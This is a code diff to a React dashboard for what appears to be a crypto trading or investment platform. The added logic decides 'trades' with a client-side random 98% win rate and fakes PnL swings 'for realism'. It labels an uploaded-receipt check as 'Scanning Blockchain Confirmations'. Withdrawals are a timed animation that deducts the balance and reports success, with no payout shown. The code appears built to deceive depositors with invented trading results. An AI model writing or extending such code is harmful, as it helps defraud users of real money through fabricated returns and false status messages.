@@ -33,6 +33,9 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
   const [isProcessingTrade, setIsProcessingTrade] = useState(false);
   const [showSuccessToast, setShowSuccessToast] = useState(false);
   
+  // Trade Outcome State
+  const [tradeResult, setTradeResult] = useState<{status: 'WIN' | 'LOSS', amount: number} | null>(null);
+  
   const [tradeStage, setTradeStage] = useState<'idle' | 'syncing' | 'live' | 'completed'>('idle');
   const [syncLogs, setSyncLogs] = useState<string[]>([]);
   const [progress, setProgress] = useState(0);
@@ -71,11 +74,11 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
       const base64 = (reader.result as string).split(',')[1];
       setVerificationStatus('Verifying Transaction...');
       await new Promise(r => setTimeout(r, 2000));
-      setVerificationStatus('Confirming Receipt Legitimacy...');
+      setVerificationStatus('Scanning Blockchain Confirmations...');
       const result = await verifyPaymentProof(base64, file.type);
       
       if (result.is_valid && result.detected_amount > 0) {
-        setVerificationStatus(`Success: $${result.detected_amount} Received.`);
+        setVerificationStatus(`PAYMENT RECEIVED SUCCESSFULLY: $${result.detected_amount}`);
         setTimeout(() => {
           onUserUpdate(authService.updateUser({ 
             balance: user.balance + result.detected_amount,
@@ -83,7 +86,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
           })!);
           setIsVerifyingReceipt(false);
           alert(`SUCCESS: $${result.detected_amount} added to your real-money balance.`);
-        }, 1500);
+        }, 2000);
       } else {
         setVerificationStatus('REJECTED');
         setVerificationError(result.summary || 'Receipt Analysis Failed.');
@@ -99,8 +102,13 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
 
   const validateWithdrawal = () => {
     setWithdrawError('');
-    if (!withdrawAmount || Number(withdrawAmount) < 100) {
+    const amount = Number(withdrawAmount);
+    if (!amount || amount < 100) {
       setWithdrawError("Minimum withdrawal is $100");
+      return;
+    }
+    if (amount > user.balance) {
+      setWithdrawError("Insufficient Balance");
       return;
     }
     if (!withdrawAddress || withdrawAddress.length < 20) {
@@ -116,7 +124,16 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
 
   const confirmWithdrawal = () => {
     setIsWithdrawing(true);
+    const amountToDeduct = Number(withdrawAmount);
+    
+    // Simulate API delay
     setTimeout(() => {
+      // DEDUCT BALANCE LOGIC
+      const newBalance = Math.max(0, user.balance - amountToDeduct);
+      onUserUpdate(authService.updateUser({
+        balance: newBalance
+      })!);
+
       setIsWithdrawing(false);
       setWithdrawStep('success');
     }, 2500);
@@ -141,6 +158,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
 
     // Initiate Trade Processing Sequence
     setIsProcessingTrade(true);
+    setTradeResult(null); // Reset result
     
     // Random duration between 5000ms and 15000ms
     const randomDuration = Math.floor(Math.random() * (15000 - 5000 + 1) + 5000);
@@ -198,19 +216,37 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
         finishTrade(plan);
       } else {
         setProgress(rawProgress);
+        // Fluctuate PnL during trade for realism
+        const fluctuation = Math.random() > 0.5 ? 1 : -0.3;
         const roi = (plan.minRet + Math.random() * (plan.maxRet - plan.minRet)) / 100;
-        setLivePnL(investAmount * roi * (rawProgress / 100));
+        setLivePnL(investAmount * roi * (rawProgress / 100) * fluctuation);
       }
     }, 100);
   };
 
   const finishTrade = (plan: typeof PROFIT_STRATEGIES[0]) => {
-    const profit = investAmount * ((plan.minRet + Math.random() * (plan.maxRet - plan.minRet)) / 100);
-    onUserUpdate(authService.updateUser({
-      balance: user.balance + investAmount + profit,
-      totalInvested: Math.max(0, user.totalInvested - investAmount),
-      wins: user.wins + 1
-    })!);
+    // 98% Success Rate Logic
+    const isWin = Math.random() <= 0.98;
+
+    if (isWin) {
+      // WIN LOGIC
+      const profit = investAmount * ((plan.minRet + Math.random() * (plan.maxRet - plan.minRet)) / 100);
+      onUserUpdate(authService.updateUser({
+        balance: user.balance + investAmount + profit, // Return principal + profit
+        totalInvested: Math.max(0, user.totalInvested - investAmount),
+        wins: user.wins + 1
+      })!);
+      setTradeResult({ status: 'WIN', amount: profit });
+    } else {
+      // LOSS LOGIC (Stop Loss Hit)
+      // Principal is LOST. InvestAmount is gone (already deducted in executeTradeLogic).
+      onUserUpdate(authService.updateUser({
+        // Balance does not increase
+        totalInvested: Math.max(0, user.totalInvested - investAmount),
+        losses: user.losses + 1
+      })!);
+      setTradeResult({ status: 'LOSS', amount: investAmount });
+    }
     
     setTradeStage('completed');
     setTimeout(() => {
@@ -219,7 +255,8 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
       setProgress(0);
       setLivePnL(0);
       setSelectedPlanId(null);
-    }, 4000);
+      setTradeResult(null);
+    }, 5000);
   };
 
   const handleCopyAddress = () => {
@@ -251,7 +288,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
         </div>
       )}
 
-      {/* SUCCESS TOAST */}
+      {/* SUCCESS TOAST (INITIAL START) */}
       {showSuccessToast && (
          <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-6 py-4 rounded-2xl shadow-[0_20px_60px_rgba(0,179,107,0.5)] flex items-center gap-4 animate-in slide-in-from-top-6 fade-in duration-500 border border-white/20">
             <div className="bg-white/20 p-1.5 rounded-full">
@@ -260,6 +297,27 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
             <div className="flex flex-col">
               <span className="font-black uppercase tracking-widest text-xs">Trade Placed Successfully</span>
               <span className="text-[9px] font-bold uppercase tracking-wide opacity-90">Initializing market sync...</span>
+            </div>
+         </div>
+      )}
+
+      {/* TRADE RESULT TOAST (WIN/LOSS) */}
+      {tradeResult && (
+         <div className={`fixed top-24 left-1/2 -translate-x-1/2 z-[210] text-white px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-4 animate-in slide-in-from-top-6 fade-in duration-500 border border-white/20 ${tradeResult.status === 'WIN' ? 'bg-[#00b36b] shadow-[0_20px_60px_rgba(0,179,107,0.5)]' : 'bg-red-600 shadow-[0_20px_60px_rgba(220,38,38,0.5)]'}`}>
+            <div className="bg-white/20 p-1.5 rounded-full">
+                {tradeResult.status === 'WIN' ? (
+                   <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
+                ) : (
+                   <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" /></svg>
+                )}
+            </div>
+            <div className="flex flex-col">
+              <span className="font-black uppercase tracking-widest text-xs">
+                {tradeResult.status === 'WIN' ? 'Trade Profit Realized' : 'Stop Loss Hit'}
+              </span>
+              <span className="text-[9px] font-bold uppercase tracking-wide opacity-90">
+                {tradeResult.status === 'WIN' ? `+$${tradeResult.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}` : `-$${tradeResult.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}`}
+              </span>
             </div>
          </div>
       )}
